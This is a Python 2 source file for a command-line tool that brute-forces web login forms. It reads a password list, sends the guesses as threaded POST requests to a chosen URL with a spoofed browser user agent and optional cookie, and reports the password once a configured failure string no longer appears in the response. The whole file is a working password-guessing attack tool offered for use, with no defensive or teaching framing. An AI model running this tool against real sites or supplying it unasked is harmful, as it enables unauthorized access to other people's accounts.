import os
import sys
import urllib
import requests
from stopwatch import Stopwatch
from queue import Queue
from threading import Thread
from bcolors import ANSIColor

#current working script dir
__CWD__ = os.path.dirname(os.path.realpath(__file__))
__PASS__ = '%PASS%'
__USER_AGENT__ = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"

url = None
passwd_file = None
params = {}
n_threads = 1
bad_login = "Bad Login"
option_keys = ['-o', '-p', '--param', '-b', '-t', '-c']
attempted_passwords = 0
processing = True
passkey = ""
cookie = ""

#password queue
pass_queue = Queue()

#get system arguments and populate our fields with them
def populate_from_args():
    global url
    global passwd_file
    global params
    global bad_login
    global n_threads
    global cookie
    index = 0
    for arg in sys.argv:
        if arg in option_keys:
            if arg == '-o':
                url = sys.argv[index + 1]
            if arg == '-p':
                passwd_file = sys.argv[index + 1]
            if arg == '--param':
                key, value = sys.argv[index + 1].split('=')
                params[key] = value
            if arg == '-b':
                bad_login = sys.argv[index + 1]
            if arg == '-t':
                n_threads = int(sys.argv[index + 1])
            if arg == '-c':
                cookie = sys.argv[index + 1]
        index += 1

#we need to check that our args are in place
def check_necessary_args():
    if url == None:
        print("No url provided, please provide one using the -o flag")
        exit()
    if passwd_file == None:
        print("Please provide a password list with the -p flag")
        exit()
    if len(params) < 1:
        print('No params found, usage is --params user=admin')
        exit()
    if "%PASS%" not in params.itervalues():
        print("At least one key has to have the value %PASS% in order to inject passwords")
        exit()

#checks the html response for the bad login string
def check_for_bad_login(response):
    if bad_login in response:
        return True
    return False

def read_file():
    global pass_queue
    print("Reading passwords...")
    with open(passwd_file) as passwords:
        list_buff = [x.strip() for x in passwords.readlines()]
        for passwd in list_buff:
            pass_queue.put(passwd)

def get_key_by_val(val, d):
    result = str()
    for key in d:
        if d[key] == val:
            result = key
    return result

def check_each_password():
    global params
    global pass_queue
    global attempted_passwords
    global processing
    global cookie

    while not pass_queue.empty() and processing:
        try:

            password = pass_queue.get(timeout = 1)
            new_params = dict(params)
            new_params[passkey] = password

            headers = {
                'User-Agent': __USER_AGENT__
            }

            if len(cookie) > 0:
                headers['Cookie'] = cookie

            print("Checking for password '" + password + "'")

            try:
                response = requests.post(url, data = new_params, headers = headers, timeout = 10)
            except requests.exceptions.Timeout, te:
                print("Connection timed out, retrying...")
                pass_queue.put(password)
                continue
            
            #print(response.text)
            has_bad_login = check_for_bad_login(response.text)
            attempted_passwords += 1

            if not has_bad_login:
                print(ANSIColor.WARNING + "Congratz you have logged in! The password is " + password)
                pass_queue = Queue()
                processing = False
                break
            else:
                if processing:
                    print("Authentication failed")


        except Exception, e:
            #empty queue
            print(str(e))
            pass_queue = Queue()
            processing = False
            break


if __name__ == "__main__":

    sw = Stopwatch()
    sw.start()
    threads = []

    try:
        try:
            populate_from_args()
        except Exception:
            print("Error: Incorrect format provided")
            exit()

        try:
            read_file()
        except IOError:
            print("Error: No such file found, quitting")
            exit()

        check_necessary_args()
        passkey = get_key_by_val(__PASS__, params)

        for i in range(n_threads):
            t = Thread(target = check_each_password)
            t.setDaemon(True)
            t.start()
            threads.append(t)

        #wait for all threads to finish
        for thread in threads:
            thread.join()

        sw.stop()
        print(ANSIColor.OKGREEN + "Finished in " + sw.get_time() + ", attempted " + 
        str(attempted_passwords) + " passwords")

    except KeyboardInterrupt, ki:
        print(str(ki))
        processing = False

